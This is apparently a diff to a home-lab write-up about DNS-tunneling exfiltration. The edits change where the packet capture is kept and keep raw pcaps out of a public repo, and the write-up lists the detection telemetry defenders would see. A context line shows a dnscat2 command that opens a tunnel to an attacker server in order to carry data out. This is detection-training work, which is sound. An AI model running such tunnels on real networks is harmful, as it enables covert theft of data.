@@ -7,7 +7,7 @@ Data left `vic-lin`, but not over any obvious channel. It was smuggled out insid
 
 ## Lab setup
 - `vic-lin` (victim) + attacker running a DNS tunneling server (`dnscat2` or `iodine`) on `kali`, authoritative for a lab domain like `t.lab`.
-- Capture: `tcpdump -i eth0 -w /cases/s09.pcap 'udp port 53'` on `vic-lin`, and enable DNS query logging if you run a resolver.
+- Capture: `tcpdump -i any -w ~/captures/s09.pcap 'udp port 53'` on `vic-lin`, and enable DNS query logging if you run a resolver. Keep the pcap on the victim; raw captures never go to the public cases repo.
 
 ## Run it
 ```bash
@@ -20,7 +20,7 @@ dnscat2 --dns server=10.10.10.5,domain=t.lab
 Randomize file size and query rate so "how much left" is a real estimate.
 
 ## Cleanup / revert
-Kill the tunnel, revert to `baseline`. Keep the pcap. It is your evidence and a portfolio artifact.
+Kill the tunnel, revert to `baseline`. Keep the pcap on the victim as evidence. It stays lab-local; the write-up describes it, but the file itself never lands in the public repo.
 
 ## What telemetry this generates
 - **pcap / DNS logs**: a flood of queries for long, high-entropy, base32/hex subdomains under `t.lab` (`a3f9c1...e2.t.lab`). Abnormal length, abnormal volume, one domain, TXT/NULL/CNAME record types.
